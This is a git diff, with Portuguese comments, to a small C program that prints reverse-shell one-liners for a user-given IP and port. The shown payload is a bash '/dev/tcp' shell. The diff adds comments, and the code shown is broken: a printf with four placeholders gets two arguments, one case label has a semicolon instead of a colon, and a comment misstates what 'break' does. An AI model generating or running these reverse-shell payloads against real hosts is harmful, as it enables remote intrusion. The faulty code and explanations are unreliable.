@@ -7,24 +7,27 @@ void ajuda(){
 }
 
 // ArgV --> Vetor de char que contém os argumentos   == (Array de strings)
-//          argv[0] será o nome do programa executado
+//          argv[0] será o nome do programa executado.
 // ArgC --> Valor inteiro que indica a quantidade    == (É um Inteiro(int) que indica quantos argumentos foram passados na linha de comando)
 //          de argumentos que foram passados para
-//          chamar o programa
+//          chamar o programa.
 int main(int argc, char *argv[]){
   // Se não houverem 4 argumentos
   // OU o comprimento(string length) do argv 1 for maior que 40
   // OU o comprimento do argv 2 for maior que 5
   // OU o comprimento do argv 3 for diferente de 1
+  // Invoca a função "ajuda" e sai com exit code 0 (sucesso).
   if(argc != 4 || strlen(argv[1]) > 40 || strlen(argv[2]) > 5 || strlen(argv[3]) != 1){
     ajuda();
     return 0;
   }
 
-
+  // Se o argumento 3 for 1, ou 2, ou 3... etc.
   switch (argv[3][0]){
     case '1':
       printf(">> Bash:\n/bin/bash -i >& /dev/tcp/%s/%s 0>&1\nbash -i >& /dev/tcp/%s/%s 0>&1\n", argv[1], argv[2]);
+      // break resultará no término da 'função' case e switch, ou seja,
+      // vai terminal o programa e retornar 0 (sucesso) no final do corpo do switch.
       break;
 
     case '2';
@@ -58,6 +61,7 @@ int main(int argc, char *argv[]){
       printf("Opção errada!");
       return 1;
     }
+  // A parte que comentei acima, após o break ser acionado, o programa irá retornar exit code 0
   return 0;
 
 }
